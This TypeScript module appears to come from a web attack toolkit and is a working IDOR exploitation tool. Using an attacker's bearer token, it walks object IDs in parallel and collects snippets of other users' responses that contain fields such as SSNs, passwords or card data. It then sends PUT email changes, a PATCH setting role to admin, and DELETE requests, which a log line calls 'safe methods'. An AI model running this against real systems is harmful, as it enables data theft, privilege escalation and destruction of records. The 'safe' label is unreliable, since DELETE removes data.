// Parallel IDOR prober — TS port of app/modules/idor_probe.py (dropped
// ghostx-web project, itself a port of the CLI toolkit's ghost_idor.py).
// `target` is a single endpoint URL containing an `{ID}` placeholder.

import { JobContext, ModuleMeta, safeFetch, validateTargetUrl } from "./base";

export const meta: ModuleMeta = {
  id: "idor_probe",
  name: "Parallel IDOR Prober",
  description: "Tests read/write IDOR across an endpoint template by swapping an {ID} placeholder.",
  riskTier: "active",
};

const SENSITIVE_FIELDS = [
  "email", "phone", "address", "ssn", "password", "token", "secret",
  "credit", "card", "bank", "salary", "dob", "birth", "social",
  "api_key", "apikey", "private", "session", "balance", "payment",
];

const DEFAULT_IDS = [
  ...Array.from({ length: 50 }, (_, i) => String(i + 1)),
  "100", "500", "1000", "9999", "10000",
];
const CONCURRENCY = 20;

function parseIds(raw: string | undefined): string[] {
  if (!raw) return DEFAULT_IDS;
  return raw
    .split(/[,\n]/)
    .map((v) => v.trim())
    .filter(Boolean);
}

async function mapWithConcurrency<T, R>(items: T[], limit: number, fn: (item: T) => Promise<R>): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let idx = 0;
  async function worker() {
    while (idx < items.length) {
      const current = idx++;
      results[current] = await fn(items[current]);
    }
  }
  await Promise.all(Array.from({ length: Math.min(limit, items.length) }, worker));
  return results;
}

export async function* run(
  targetRaw: string,
  params: Record<string, string>,
  ctx: JobContext
): AsyncGenerator<string> {
  const endpoint = targetRaw.trim();
  if (!endpoint.includes("{ID}")) {
    yield "[ERR] target must contain an {ID} placeholder, e.g. https://target.com/api/users/{ID}";
    return;
  }
  validateTargetUrl(endpoint.replace("{ID}", "1"));

  const token = (params.token ?? "").trim();
  if (!token) {
    yield "[ERR] params.token (attacker bearer token) is required";
    return;
  }

  const ids = parseIds(params.ids);
  const headers = { Authorization: `Bearer ${token}`, "Content-Type": "application/json" };

  yield "=== GHOST IDOR PROBER ===";
  yield `Endpoint: ${endpoint}`;
  yield `IDs to test: ${ids.length}`;
  yield "==========================";

  const findings: Array<Record<string, unknown>> = [];

  yield "";
  yield "[*] Testing READ IDOR...";
  const readLines = await mapWithConcurrency(ids, CONCURRENCY, async (vid) => {
    const url = endpoint.replace("{ID}", vid);
    const resp = await safeFetch(url, ctx, { headers });
    if (!resp || resp.status !== 200) return null;
    const bodyLower = (await resp.text().catch(() => "")).toLowerCase();
    const exposed = SENSITIVE_FIELDS.filter((f) => bodyLower.includes(f));
    if (exposed.length > 0) {
      findings.push({ type: "READ_IDOR", url, victimId: vid, status: resp.status, exposedFields: exposed, evidence: bodyLower.slice(0, 500) });
      return [`[VULN] IDOR CONFIRMED: ${url}`, `  Exposed: ${exposed.join(", ")}`];
    }
    return [`[200-NO-PII] ${url}`];
  });
  for (const lines of readLines) {
    if (lines) for (const line of lines) yield line;
  }

  yield "";
  yield "[*] Testing WRITE IDOR (sequential, safe methods, first 5 IDs)...";
  for (const vid of ids.slice(0, 5)) {
    const url = endpoint.replace("{ID}", vid);
    const attempts: Array<[string, Record<string, unknown> | undefined]> = [
      ["PUT", { email: "ghost_idor_test@proof.com" }],
      ["PATCH", { role: "admin" }],
      ["DELETE", undefined],
    ];
    for (const [method, payload] of attempts) {
      const resp = await safeFetch(url, ctx, {
        method,
        headers,
        body: payload ? JSON.stringify(payload) : undefined,
      });
      if (resp && [200, 201, 204].includes(resp.status)) {
        yield `[VULN] WRITE IDOR: ${method} ${url} -> ${resp.status}`;
        findings.push({ type: "WRITE_IDOR", url, method, victimId: vid, status: resp.status });
        break;
      }
    }
    await new Promise((r) => setTimeout(r, 500));
  }

  ctx.result.findings = findings;
  yield "";
  yield "==========================";
  yield findings.length > 0 ? `[VULN] ${findings.length} IDOR(s) confirmed` : "[OK] No IDOR found across tested IDs";
}
